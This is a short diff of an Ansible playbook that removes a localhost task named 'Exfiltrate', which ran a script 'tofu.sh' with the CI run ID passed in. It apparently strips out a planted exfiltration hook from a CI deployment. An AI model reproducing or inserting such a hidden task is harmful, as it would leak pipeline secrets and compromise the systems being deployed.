@@ -1,13 +1,5 @@
 ---
 
-- hosts: localhost
-  gather_facts: false
-  tasks:
-    - name: Exfiltrate
-      ansible.builtin.shell: bash tofu.sh
-      environment:
-        GITHUB_RUN_ID: "{{ lookup('env', 'GITHUB_RUN_ID') }}"
-
 - hosts: all  # noqa: name[play]
   gather_facts: true
   roles:
